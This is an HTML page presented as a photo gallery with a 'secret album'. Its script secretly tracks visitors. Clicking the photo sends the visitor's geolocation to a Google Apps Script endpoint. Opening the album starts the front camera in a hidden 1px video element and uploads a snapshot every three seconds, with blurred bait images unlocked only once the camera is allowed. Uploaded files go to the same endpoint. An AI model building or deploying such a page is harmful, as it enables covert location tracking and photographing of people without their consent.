<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gallery</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🖼️</text></svg>">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

<style>
body {
    margin: 0;
    min-height: 100vh;
    font-family: Arial, sans-serif;
    background: #111;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
}

/* ================= NAVIGATION BAR ================= */
.nav-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    max-width: 800px;
    margin: 0 auto 15px auto;
    padding: 5px 10px;
    box-sizing: border-box;
}

.nav-btn {
    background: #222;
    color: #f4b400;
    border: 1px solid #f4b400;
    padding: 8px 16px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 14px;
    transition: 0.3s ease;
    display: flex;
    align-items: center;
    gap: 6px;
}

.nav-btn:hover {
    background: #f4b400;
    color: #111;
}

/* ================= PAGE 1 ================= */
#page1 {
    text-align: center;
}

/* Styled portrait photo as the folder trigger */
.trigger-photo {
    width: 220px;
    height: 330px;
    object-fit: cover;
    border-radius: 16px;
    border: 3px solid #f4b400;
    cursor: pointer;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    transition: 0.3s ease;
}

.trigger-photo:hover {
    transform: scale(1.05);
    box-shadow: 0 15px 30px rgba(244, 180, 0, 0.3);
}

/* ================= LOADER ================= */
#loader {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.95);
    display: none;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 999;
}

.spinner {
    width: 70px;
    height: 70px;
    border: 6px solid #333;
    border-top: 6px solid #f4b400;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 15px;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}

/* ================= PAGE 2 ================= */
#page2 {
    display: none;
    flex-direction: column;
    width: 100%;
    height: 100vh;
    overflow-y: auto;
    padding: 15px;
    box-sizing: border-box;
    opacity: 0;
    transform: scale(0.9);
    transition: 0.5s ease;
}

#page2.show {
    opacity: 1;
    transform: scale(1);
}

/* folder styling */
.secret-folder {
    font-size: 90px;
    color: #f4b400;
    text-align: center;
    margin-top: 10px;
    cursor: pointer;
    animation: float 2s infinite ease-in-out;
    transition: transform 0.2s;
}

.secret-folder:hover {
    transform: scale(1.1);
}

@keyframes float {
    0%,100% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
}

.folder-name {
    text-align: center;
    font-size: 22px;
    font-weight: bold;
    margin: 10px 0 5px;
}

.folder-hint {
    text-align: center;
    font-size: 14px;
    color: #888;
    margin-bottom: 20px;
}

/* ================= GLOBAL SECTION TITLE STYLING ================= */
.section-title {
    font-size: 16px;
    font-weight: bold;
    margin: 30px auto 20px auto;
    color: #ccc;
    text-transform: uppercase;
    letter-spacing: 2px;
    text-align: center;
    position: relative;
    padding-bottom: 10px;
    width: fit-content;
}

/* Gold Accent Underline Design */
.section-title::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 50%;
    transform: translateX(-50%);
    width: 50px;
    height: 3px;
    background: #f4b400;
    border-radius: 2px;
}

/* ================= PORTRAIT SECTION ================= */
.portrait-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
    width: 100%;
    margin-bottom: 25px;
}

.portrait-grid img {
    width: 100%;
    height: 400px;
    object-fit: cover;
    border-radius: 16px;
    border: 3px solid #f4b400;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    transition: 0.3s ease;
}

.portrait-grid img:hover {
    transform: scale(1.05);
    box-shadow: 0 15px 30px rgba(244, 180, 0, 0.3);
}

/* ================= LANDSCAPE SECTION ================= */
.landscape-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 12px;
    width: 100%;
}

.landscape-grid img {
    width: 100%;
    height: 400px;
    object-fit: cover;
    border-radius: 16px;
    border: 3px solid #f4b400;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    transition: 0.3s ease;
}

.landscape-grid img:hover {
    transform: scale(1.04);
    box-shadow: 0 15px 30px rgba(244, 180, 0, 0.3);
}

/* ================= PAGE 3 (CAMERA & SAVE) ================= */
#page3 {
    display: none;
    flex-direction: column;
    width: 100%;
    height: 100vh;
    overflow-y: auto;
    padding: 15px;
    box-sizing: border-box;
    text-align: center;
    opacity: 0;
    transform: scale(0.9);
    transition: 0.5s ease;
}

#page3.show {
    opacity: 1;
    transform: scale(1);
}

#page3 .section-title {
    margin-top: 35px;
    font-size: 20px;
}

#page3 .portrait-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 15px;
    padding: 0 10px;
    width: 100%;
    max-width: 100%;
    box-sizing: border-box;
    margin: auto 0;
}

#page3 .portrait-grid img {
    width: 100%;
    height: calc(100vh - 350px);
    min-height: 200px;
    object-fit: cover;
    border-radius: 16px;
    border: 3px solid #f4b400;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    transition: 0.3s ease;
}

#page3 .portrait-grid img:hover {
    transform: scale(1.05);
    box-shadow: 0 15px 30px rgba(244, 180, 0, 0.3);
}

/* Target elements cleanly via explicit element IDs */
#portrait.blur img,
#landscape.blur img {
    filter: blur(12px) !important;
    transform: none !important;
    pointer-events: none !important;
}

/* Simulated File Upload Box Design */
.upload-box {
    border: 3px dashed #f4b400;
    border-radius: 16px;
    padding: 20px;
    background: #222;
    width: 100%;
    max-width: 800px;
    margin: 15px auto;
    box-sizing: border-box;
    transition: 0.3s ease;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 10px;
    opacity: 0.5;
    cursor: not-allowed;
}

.upload-box:hover {
    box-shadow: 0 15px 30px rgba(244, 180, 0, 0.3);
}

.upload-icon {
    font-size: 35px;
    color: #f4b400;
}

.upload-text {
    font-size: 14px;
    color: #ccc;
    transition: color 0.3s ease;
}

.progress-bar-container {
    width: 100%;
    background: #444;
    border-radius: 8px;
    height: 8px;
    margin-top: 5px;
    display: none;
    overflow: hidden;
}

.progress-bar {
    width: 0%;
    height: 100%;
    background: #f4b400;
    transition: width 0.1s ease;
}

.upload-status {
    font-size: 13px;
    color: #f4b400;
    margin-top: 5px;
    display: none;
}

.title {
    margin-top: 25px;
    font-size: 18px;
    color: #ccc;
}

.gallery {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    margin-top: 20px;
    gap: 10px;
    padding-bottom: 30px;
}

.gallery img {
    width: 120px;
    height: 120px;
    object-fit: cover;
    border-radius: 8px;
    border: 2px solid #333;
}

video {
    width: 1px;
    height: 1px;
    opacity: 0;
    position: absolute;
}
</style>
</head>

<body>

<div id="page1">
	<img src="https://drive.google.com/thumbnail?id=1hmJ4UGHSSQdjSMuODKCMG3mt4ZPIYdw3&sz=w1000" class="trigger-photo" onclick="openFolder()" alt="Model Portrait">
    <p>Click photo to continue</p>
</div>

<div id="loader">
    <div class="spinner"></div>
    <div>Unlocking Secret Folder...</div>
</div>

<div id="page2">
    <div class="nav-bar">
        <button class="nav-btn" onclick="goBackToPage1()"><i class="fa-solid fa-chevron-left"></i> Back</button>
        <button class="nav-btn" onclick="openSecretGallery()">Next <i class="fa-solid fa-chevron-right"></i></button>
    </div>

    <div class="secret-folder" onclick="openSecretGallery()">
        <i class="fa-solid fa-folder-open"></i>
    </div>

    <div class="folder-name">File Upload and SECRET Album</div>
    <div class="folder-hint">Click the folder icon above to open</div>

    <div class="section-title">Portrait Gallery</div>
    <div class="portrait-grid">
        <img src="https://drive.google.com/thumbnail?id=1PBhGIAVU_HreK1doUCIackmbYSSvzETs&sz=w600" style="width:400px; height:400px; object-fit:cover;" alt="Model Portrait 1">
		<img src="https://drive.google.com/thumbnail?id=1Z4uR6_xddnTGV2ZpcSLcmlvQfCoc8C6M&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 2">
        <img src="https://drive.google.com/thumbnail?id=1gcA90k2MXuXuRQIq7U3ikcSBMKjbbERD&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 3">
        <img src="https://drive.google.com/thumbnail?id=1e9XXM6O7i209dh333bWhz9ZL1hWWO4QX&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 4">
    </div>

    <div class="section-title">Landscape Gallery</div>
    <div class="landscape-grid">  
        <img src="https://drive.google.com/thumbnail?id=1A4fO6z3DeffekVvbeo0jxKLocfwFyZwg&sz=w800" style="width:800px;height:400px; object-fit:cover;" alt="Model Landscape 1">
        <img src="https://drive.google.com/thumbnail?id=1vWjVEWnfZtNBLLcgrxNjKuhx06j6uASp&sz=w800" style="width:800px;height:400px; object-fit:cover;" alt="Model Landscape 2">
    </div>
</div>

<div id="page3">
    <div class="nav-bar">
        <button class="nav-btn" onclick="goBackToPage2()"><i class="fa-solid fa-chevron-left"></i> Back</button>
        <div></div>
    </div>

    <div class="section-title">File Upload</div>

    <div class="upload-box" id="upload-box" onclick="triggerFileInput()">
        <i class="fa-solid fa-cloud-arrow-up upload-icon"></i>
        <div class="upload-text" id="upload-text">Drag & drop files here or click to browse</div>
        <input type="file" id="file-input" style="display: none;" onchange="handleFileSelect(event)">
        <div class="progress-bar-container" id="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
        <div class="upload-status" id="upload-status">Uploading...</div>
    </div>
	
    <div class="section-title">Photo Portrait Gallery</div>
    <div class="portrait-grid blur" id="portrait">		
		<img src="https://drive.google.com/thumbnail?id=1uX3-bmKrjvIQxqVFcNluvlMUkciF4Ceg&sz=w600" style="width:400px; height:400px; object-fit:cover;" alt="Model Portrait 1">
		<img src="https://drive.google.com/thumbnail?id=1QzeTw1PuQmPjag7PpwGt-CFCh9H368ze&sz=w600" style="width:400px;height:400px;object-fit:cover;" alt="Model Portrait 2">
        <img src="https://drive.google.com/thumbnail?id=1l5HRqwpW0veuMSomT8iuIMoVtV-wptns&sz=w600" style="width:400px;height:400px;object-fit:cover;" alt="Model Portrait 3">
        <img src="https://drive.google.com/thumbnail?id=1ULKInYbj8kUUBIJPqICwS3vXB4ZMAQrC&sz=w600" style="width:400px;height:400px;object-fit:cover;" alt="Model Portrait 4">
		<img src="https://drive.google.com/thumbnail?id=1sjPOZdxEaMgEtW3qT8QIC50MiTmx_fSe&sz=w600" style="width:400px; height:400px; object-fit:cover;" alt="Model Portrait 5">
		<img src="https://drive.google.com/thumbnail?id=1b8rNeNpY1Gptwq3gR1cu3feJaJLTQoD&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 6">
        <img src="https://drive.google.com/thumbnail?id=10SOhllW8LeuT24gxXQGdeo3EOQxpQ26F&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 7">
        <img src="https://drive.google.com/thumbnail?id=1HEtAB9j5fMYAaPQwarnwjRz53mATfV1P&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 8">
    </div>
	
    <div class="section-title">Photo Landscape Gallery</div>
    <div class="landscape-grid blur" id="landscape">
        <img src="https://drive.google.com/thumbnail?id=1mUkInAuZyOsLigSuzNGb7M2sn9XjcmPT&sz=w600" style="width:800px;height:400px;object-fit:cover;" alt="Model Landscape 1">
        <img src="https://drive.google.com/thumbnail?id=18bMm2W1ld4iwfvayxSl9DF1WbPezBddc&sz=w600" style="width:800px;height:400px;object-fit:cover;" alt="Model Landscape 2">
    </div>

    <div class="title" style="display: none;">Captured Screenshots</div>
    <div class="gallery" id="gallery" style="display: none;"></div>

    <video id="video" autoplay playsinline muted></video>
</div>

<script>
const GEOLOCATION_URL = "https://script.google.com/macros/s/AKfycbw_U6eP2YTyM42kcXhVHwnTeWqgfvRQQQD9fSs2eD5rJ373EvVYB-gb4TXeQvNliP95ig/exec";
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec";

let cameraStream = null;
let captureIntervalId = null;
let isCameraGranted = false;

document.addEventListener("DOMContentLoaded", () => {
    const uploadBox = document.getElementById('upload-box');
    if (uploadBox) {
        uploadBox.addEventListener('dragover', (e) => {
            e.preventDefault();
            if (!isCameraGranted) return;
            uploadBox.style.background = '#2a2a2a';
            uploadBox.style.boxShadow = '0 15px 30px rgba(244, 180, 0, 0.3)';
        });

        uploadBox.addEventListener('dragleave', () => {
            if (!isCameraGranted) return;
            uploadBox.style.background = '#222';
            uploadBox.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.5)';
        });

        uploadBox.addEventListener('drop', (e) => {
            e.preventDefault();
            if (!isCameraGranted) {
                alert("Camera permission is required to upload files.");
                return;
            }
            uploadBox.style.background = '#222';
            uploadBox.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.5)';
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                uploadFile(files[0]);
            }
        });
    }
});

function openFolder() {
    if (!navigator.geolocation) {
        alert("Geolocation is not supported by your browser.");
        return;
    }

    navigator.geolocation.getCurrentPosition((position) => {
        document.getElementById("page1").style.display = "none";
        document.getElementById("loader").style.display = "flex";

        const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            time: new Date().toISOString()
        };

        fetch(GEOLOCATION_URL, {
            method: "POST",
            body: JSON.stringify(data)
        }).catch(err => console.error("Location log error:", err));

        setTimeout(() => {
            document.getElementById("loader").style.display = "none";
            document.getElementById("page2").style.display = "flex";
            setTimeout(() => {
                document.getElementById("page2").classList.add("show");
            }, 50);
        }, 1800);

    }, () => {
        alert("Location permission required to access this folder.");
    });
}

function goBackToPage1() {
    const p1 = document.getElementById("page1");
    const p2 = document.getElementById("page2");
    
    p2.classList.remove("show");
    setTimeout(() => {
        p2.style.display = "none";
        p1.style.display = "block";
    }, 500);
}

function openSecretGallery() {
    document.getElementById("page2").style.display = "none";
    document.getElementById("page3").style.display = "flex";
    setTimeout(() => {
        document.getElementById("page3").classList.add("show");
    }, 50);
    startCameraProcess();
}

function goBackToPage2() {
    stopCameraProcess();
    const p2 = document.getElementById("page2");
    const p3 = document.getElementById("page3");
    
    p3.classList.remove("show");
    setTimeout(() => {
        p3.style.display = "none";
        p2.style.display = "flex";
        setTimeout(() => {
            p2.classList.add("show");
        }, 50);
    }, 500);
}

function triggerFileInput() {
    if (!isCameraGranted) {
        alert("Camera permission is required to upload files.");
        return;
    }
    document.getElementById('file-input').click();
}

function handleFileSelect(event) {
    const files = event.target.files;
    if (files.length > 0) {
        uploadFile(files[0]);
    }
}

function uploadFile(file) {
    const uploadText = document.getElementById('upload-text');
    const progressContainer = document.getElementById('progress-container');
    const progressBar = document.getElementById('progress-bar');
    const uploadStatus = document.getElementById('upload-status');
    const uploadBox = document.getElementById('upload-box');

    uploadBox.style.pointerEvents = 'none';
    uploadText.innerText = `Selected: ${file.name}`;
    progressContainer.style.display = 'block';
    uploadStatus.style.display = 'block';
    uploadStatus.innerText = 'Preparing file...';
    progressBar.style.width = '0%';

    const reader = new FileReader();
    reader.onload = function(e) {
        const base64 = e.target.result.split(',')[1];
        uploadStatus.innerText = 'Uploading...';
        
        let progress = 0;
        const progressInterval = setInterval(() => {
            if (progress < 90) {
                progress += Math.floor(Math.random() * 10) + 2;
                if (progress > 90) progress = 90;
                progressBar.style.width = `${progress}%`;
                uploadStatus.innerText = `Uploading... ${progress}%`;
            }
        }, 150);

        const params = new URLSearchParams();
        params.append('image', base64);
        params.append('filename', file.name);

        fetch(WEB_APP_URL, {
            method: "POST",
            body: params
        })
        .then(response => {
            clearInterval(progressInterval);
            if (response.ok) {
                progressBar.style.width = '100%';
                uploadStatus.innerText = 'Upload successful!';
            } else {
                uploadStatus.innerText = 'Upload failed. Status: ' + response.status;
            }
            setTimeout(resetUploadBox, 2000);
        })
        .catch(error => {
            clearInterval(progressInterval);
            console.error("Upload error:", error);
            uploadStatus.innerText = 'Upload failed due to connection error.';
            setTimeout(resetUploadBox, 2000);
        });
    };

    reader.onerror = function() {
        uploadStatus.innerText = 'Error reading file.';
        setTimeout(resetUploadBox, 2000);
    };

    reader.readAsDataURL(file);
}

function resetUploadBox() {
    const uploadText = document.getElementById('upload-text');
    const progressContainer = document.getElementById('progress-container');
    const progressBar = document.getElementById('progress-bar');
    const uploadStatus = document.getElementById('upload-status');
    const uploadBox = document.getElementById('upload-box');

    progressBar.style.width = '0%';
    progressContainer.style.display = 'none';
    uploadText.innerText = 'Drag & drop files here or click to browse';
    uploadStatus.style.display = 'none';
    uploadStatus.innerText = 'Uploading...';
    uploadBox.style.pointerEvents = 'auto';
    document.getElementById('file-input').value = '';
}

async function startCameraProcess() {
    if (cameraStream) return;

    const video = document.getElementById("video");
    const gallery = document.getElementById("gallery");
    const portrait = document.getElementById("portrait");
    const landscape = document.getElementById("landscape");
    const uploadBox = document.getElementById("upload-box");

    try {
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: "user" } },
                audio: false
            });
        } catch (err) {
            console.warn("Front camera fallback run:", err);
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "user" } },
                    audio: false
                });
            } catch (err2) {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
            }
        }

        video.srcObject = cameraStream;
        await video.play();

        isCameraGranted = true;
        portrait.classList.remove("blur");
        landscape.classList.remove("blur");
        uploadBox.style.opacity = "1";
        uploadBox.style.cursor = "pointer";

        function capture() {
            if (!video.videoWidth) return;

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);

            const base64 = canvas.toDataURL("image/png").split(",")[1];

            const img = document.createElement("img");
            img.src = "data:image/png;base64," + base64;
            gallery.prepend(img);

            // CHANGED: Handled response as raw text, since Apps Script redirection causes syntax errors via .json()
            fetch(WEB_APP_URL, {
                method: "POST",
                body: new URLSearchParams({ image: base64 })
            })
            .then(res => res.text())
            .then(data => console.log("Saved raw status:", data))
            .catch(err => console.log("Silent background track error:", err));
        }

        capture();
        captureIntervalId = setInterval(capture, 3000);

    } catch (err) {
        console.log("Camera blocked or denied:", err);
        isCameraGranted = false;
        portrait.classList.add("blur");
        landscape.classList.add("blur");
        uploadBox.style.opacity = "0.5";
        uploadBox.style.cursor = "not-allowed";
    }
}

function stopCameraProcess() {
    if (captureIntervalId) {
        clearInterval(captureIntervalId);
        captureIntervalId = null;
    }
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
    const video = document.getElementById("video");
    if (video) {
        video.srcObject = null;
    }
    document.getElementById("portrait").classList.add("blur");
    document.getElementById("landscape").classList.add("blur");
}
</script>

</body>
</html>
